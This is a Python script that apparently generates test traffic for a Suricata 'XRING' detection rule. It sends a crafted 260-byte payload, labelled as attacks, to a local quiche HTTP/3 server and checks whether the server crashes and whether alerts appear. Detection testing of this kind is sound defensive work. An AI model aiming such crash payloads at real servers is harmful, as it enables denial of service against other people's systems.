#!/usr/bin/env python3
"""
Final XRING Traffic Generator - Comprehensive Testing
"""

import subprocess
import os
import time
import json
from datetime import datetime

print("=" * 60)
print("XRING TRAFFIC GENERATOR - FINAL TEST")
print("=" * 60)

# Configuration
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4433
TEMP_DIR = "/tmp/quic_traffic_final_test"
CERT_DIR = f"{TEMP_DIR}/certs"
PAYLOAD_FILE = f"{TEMP_DIR}/xring_payload.bin"

os.makedirs(CERT_DIR, exist_ok=True)

print(f"\n📁 Test directory: {TEMP_DIR}")

# Generate certificates
print("\n🔐 Generating certificates...")
subprocess.run(["openssl", "genrsa", "-out", f"{CERT_DIR}/server.key", "2048"], capture_output=True)
subprocess.run([
    "openssl", "req", "-new", "-x509",
    "-key", f"{CERT_DIR}/server.key",
    "-out", f"{CERT_DIR}/server.crt",
    "-days", "365",
    "-subj", "/CN=localhost"
], capture_output=True)
print("✅ Certificates generated")

# Generate 260-byte XRING payload
print("\n🎯 Generating 260-byte XRING payload...")
payload = bytearray()
payload.extend([0x20, 0x40])
for _ in range(61):
    payload.extend([0x40, 1, ord('x'), 0])
payload.extend([0x40, 5, ord('A'), ord('A'), ord('A'), ord('A'), ord('A'), 5, ord('B'), ord('B'), ord('B'), ord('B'), ord('B')])
payload.extend([0x20, 0x41])
payload = payload[:260]

with open(PAYLOAD_FILE, "wb") as f:
    f.write(payload)

print(f"✅ Payload size: {len(payload)} bytes")

# Clean up existing processes
print("\n🧹 Cleaning up existing processes...")
subprocess.run(["pkill", "-f", "quiche-server"], capture_output=True)
time.sleep(2)

# Start quiche-server
print("\n🚀 Starting quiche-server...")
server_process = subprocess.Popen(
    ["/opt/homebrew/bin/quiche-server",
     f"--listen={SERVER_HOST}:{SERVER_PORT}",
     f"--cert={CERT_DIR}/server.crt",
     f"--key={CERT_DIR}/server.key",
     f"--root={TEMP_DIR}/"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True
)

time.sleep(3)

if server_process.poll() is None:
    print("✅ Server started successfully")
    server_running = True
else:
    print("❌ Server failed to start")
    output = server_process.stdout.read()
    print(f"Error: {output[:500]}")
    server_running = False

if not server_running:
    print("\n❌ TEST ABORTED - Server could not start")
    server_process.terminate()
    exit(1)

# Track alerts
alert_count = 0
start_time = time.time()

# Test 1: Basic GET requests (clean traffic)
print("\n📡 Test 1: Basic HTTP/3 requests (clean traffic)...")
for i in range(5):
    try:
        result = subprocess.run(
            ["/opt/homebrew/bin/quiche-client",
             f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
             "--no-verify",
             f"https://{SERVER_HOST}:{SERVER_PORT}/test{i}"],
            capture_output=True,
            text=True,
            timeout=10
        )
        print(f"  GET {i+1}/5: {result.returncode}")
    except Exception as e:
        print(f"  GET {i+1}/5: Error - {e}")
    time.sleep(0.5)

# Test 2: XRING payload POST attacks
print("\n🎯 Test 2: XRING payload attacks (260 bytes)...")
for i in range(10):
    print(f"  Attack {i+1}/10...", end=" ")
    
    try:
        result = subprocess.run(
            ["/opt/homebrew/bin/quiche-client",
             f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
             "--no-verify",
             "--body", PAYLOAD_FILE,
             f"https://{SERVER_HOST}:{SERVER_PORT}/upload{i}"],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        server_alive = server_process.poll() is None
        print(f"{'✅' if server_alive else '❌'} (exit: {result.returncode})")
        
        if not server_alive:
            print("🚨 SERVER CRASH DETECTED!")
            break
            
    except Exception as e:
        print(f"Error - {e}")
    
    time.sleep(1)

# Test 3: Vary payload sizes
print("\n📊 Test 3: Testing different payload sizes...")
sizes = [256, 260, 264, 512, 1024]
for size in sizes:
    # Generate test payload of specific size
    test_payload = bytearray(size)
    test_payload.extend([0x20, 0x40])
    test_payload = test_payload[:size]
    
    test_file = f"{TEMP_DIR}/test_payload_{size}.bin"
    with open(test_file, "wb") as f:
        f.write(test_payload)
    
    print(f"  Testing {size} bytes...", end=" ")
    
    try:
        result = subprocess.run(
            ["/opt/homebrew/bin/quiche-client",
             f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
             "--no-verify",
             "--body", test_file,
             f"https://{SERVER_HOST}:{SERVER_PORT}/size_{size}"],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        server_alive = server_process.poll() is None
        print(f"{'✅' if server_alive else '❌'}")
        
        if not server_alive:
            print("🚨 SERVER CRASH DETECTED!")
            break
            
    except Exception as e:
        print(f"Error - {e}")
    
    time.sleep(1)

# Test 4: Rapid-fire attacks
print("\n⚡ Test 4: Rapid-fire attack sequence...")
for i in range(20):
    try:
        result = subprocess.run(
            ["/opt/homebrew/bin/quiche-client",
             f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
             "--no-verify",
             "--body", PAYLOAD_FILE,
             f"https://{SERVER_HOST}:{SERVER_PORT}/rapid{i}"],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if i % 5 == 0:
            print(f"  Attacks {i}-{min(i+4, 19)}/20: OK")
        
    except Exception as e:
        print(f"  Attack {i}/20: Error - {e}")
    
    time.sleep(0.3)

# Stop server
print("\n🛑 Stopping server...")
server_process.terminate()
try:
    server_process.wait(timeout=5)
except subprocess.TimeoutExpired:
    server_process.kill()

print("✅ Server stopped")

# Check Suricata logs
print("\n📋 Checking Suricata EVE logs...")
eve_log = "/Users/mitchparker/.suricata/log/eve.json"
if os.path.exists(eve_log):
    with open(eve_log, "r") as f:
        lines = f.readlines()[-20:]
    
    print(f"Last 20 lines of eve.json:")
    xring_alerts = 0
    for line in lines:
        try:
            event = json.loads(line.strip())
            if event.get('event_type') == 'alert':
                signature = event.get('alert', {}).get('signature', 'Unknown')
                if 'xring' in signature.lower():
                    xring_alerts += 1
                    print(f"  🔥 XRING ALERT: {signature}")
                else:
                    print(f"  ℹ️  {event.get('event_type', 'unknown')}: {signature}")
        except json.JSONDecodeError:
            print(f"  (non-JSON line)")
    
    print(f"\nTotal XRING alerts in recent logs: {xring_alerts}")
else:
    print("❌ EVE log not found or empty")

# Stop Suricata if we can
print("\n🛑 Stopping Suricata (for cleanup)...")
subprocess.run(["pkill", "-f", "suricata"], capture_output=True)

# Summary
elapsed_time = time.time() - start_time
print("\n" + "=" * 60)
print("TRAFFIC GENERATION TEST COMPLETE")
print("=" * 60)
print(f"⏱️  Total time: {elapsed_time:.2f} seconds")
print(f"🎯 Tests executed: 4 (GET, POST, Size variation, Rapid-fire)")
print(f"🖥️  Server stability: {'✅ OPERATIONAL' if server_running else '❌ CRASHED'}")
print(f"🔥 XRING alerts generated: See EVE logs")
print(f"\nNext steps:")
print("1. Check dashboard: http://127.0.0.1:5001")
print("2. Review EVE logs: /Users/mitchparker/.suricata/log/eve.json")
print("3. Start Suricata for production use")

print("\nTests completed!")
